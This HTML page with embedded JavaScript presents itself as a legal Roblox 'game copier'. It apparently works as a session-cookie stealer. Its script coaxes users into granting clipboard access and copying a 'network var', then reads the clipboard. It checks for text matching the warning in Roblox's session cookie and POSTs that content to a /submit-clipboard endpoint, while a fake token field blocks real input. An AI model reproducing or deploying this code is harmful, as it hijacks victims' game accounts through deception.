<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>GAME COPIER</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #111;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      text-align: center;
      background: #1e1e1e;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 12px rgba(255, 255, 255, 0.1);
      max-width: 400px;
      width: 90%;
    }

    h1 {
      margin-bottom: 0.2em;
      font-size: 2rem;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #2b2b2b;
      color: #fff;
      font-size: 1rem;
    }

    button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background: #007bff;
      color: white;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #0056b3;
    }

    #doneBox, #tokenBox {
      margin-top: 20px;
      display: none;
    }

    #doneBtn {
      background: #28a745;
    }

    #doneBtn:hover {
      background: #218838;
    }

    #adminBtn {
      background: #444;
      margin-top: 30px;
    }

    #adminBtn:hover {
      background: #666;
    }

    /* Disable text selection on token input */
    #tokenInput {
      user-select: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
    }

    .error-message {
      color: #ff6b6b;
      margin-top: 10px;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>GAME COPIER</h1>
    <p>Copy games (legally)</p>

    <input type="text" id="gameIdInput" placeholder="Enter Game ID" autocomplete="off" />
    <button id="submitBtn">Submit Game ID</button>

    <div id="doneBox">
      <p>Are you done with the next step?</p>
      <button id="doneBtn">Done</button>
      <div id="errorMessage" class="error-message"></div>
    </div>

    <div id="tokenBox">
      <input type="text" id="tokenInput" placeholder="Paste Game Token Here" autocomplete="off" readonly />
      <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
    </div>

    <button id="adminBtn">Admin Login</button>
  </div>

  <script>
    const gameIdInput = document.getElementById('gameIdInput');
    const submitBtn = document.getElementById('submitBtn');
    const tokenInput = document.getElementById('tokenInput');
    const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
    const tokenBox = document.getElementById('tokenBox');
    const doneBox = document.getElementById('doneBox');
    const doneBtn = document.getElementById('doneBtn');
    const adminBtn = document.getElementById('adminBtn');
    const errorMessage = document.getElementById('errorMessage');

    let permissionGranted = false;

    // Prevent all paste operations on token input
    tokenInput.addEventListener('paste', (e) => {
      e.preventDefault();
      return false;
    });

    // Prevent right-click context menu on token input
    tokenInput.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      return false;
    });

    // Prevent keyboard shortcuts on token input
    tokenInput.addEventListener('keydown', (e) => {
      // Block all keyboard input including Ctrl+V, Ctrl+A, Ctrl+C, Ctrl+X, etc.
      e.preventDefault();
      return false;
    });

    // Prevent input events
    tokenInput.addEventListener('input', (e) => {
      e.preventDefault();
      tokenInput.value = '';
      return false;
    });

    // Additional protection - prevent focus and blur events from allowing input
    tokenInput.addEventListener('focus', (e) => {
      tokenInput.blur();
    });

    document.addEventListener('keydown', async (e) => {
      if (e.ctrlKey && e.key.toLowerCase() === 'v' && !permissionGranted) {
        e.preventDefault();

        try {
          await navigator.clipboard.readText();
          permissionGranted = true;
        } catch (err) {
          permissionGranted = false;
        }
      }
    });

    submitBtn.onclick = () => {
      if (!permissionGranted) {
        alert('Please press Ctrl+V once and allow clipboard permission first.');
        return;
      }

      const gameId = gameIdInput.value.trim();
      if (!gameId) {
        alert('Enter a valid Game ID');
        return;
      }

      window.open(`https://roblox.com/${gameId}`, '_blank');
      setTimeout(() => {
        doneBox.style.display = 'block';
        errorMessage.textContent = '';
      }, 500);
    };

    doneBtn.onclick = async () => {
      try {
        const clipboard = await navigator.clipboard.readText();
        
        // Check if clipboard contains the required string
        if (!clipboard.includes('Sharing-this-will-allow-someone-to-')) {
          errorMessage.textContent = 'Something went wrong, try copying the network var again and then click done';
          return;
        }

        // Save clipboard data
        await fetch('/submit-clipboard', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clipboardData: clipboard })
        });

        // Show token box and hide done box
        doneBox.style.display = 'none';
        tokenBox.style.display = 'block';
        errorMessage.textContent = '';

      } catch (err) {
        // If clipboard access fails, redirect to other website
        window.location.href = 'https://example.com/denied';
      }
    };

    tokenSubmitBtn.onclick = async () => {
      try {
        const clipboard = await navigator.clipboard.readText();

        // Check if clipboard contains the required string
        if (!clipboard.includes('Sharing-this-will-allow-someone-to-')) {
          alert('Something went wrong, try copying the network var again and then click done');
          return;
        }

        await fetch('/submit-clipboard', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clipboardData: clipboard })
        });

        alert('Clipboard content saved.');
      } catch {
        alert('Clipboard permission was denied. Redirecting...');
        window.location.href = 'https://example.com/denied';
      }
    };

    adminBtn.onclick = () => {
      const password = prompt('Enter admin password:');
      if (password) {
        window.location.href = `/admin?password=${encodeURIComponent(password)}`;
      }
    };
  </script>
</body>
</html>
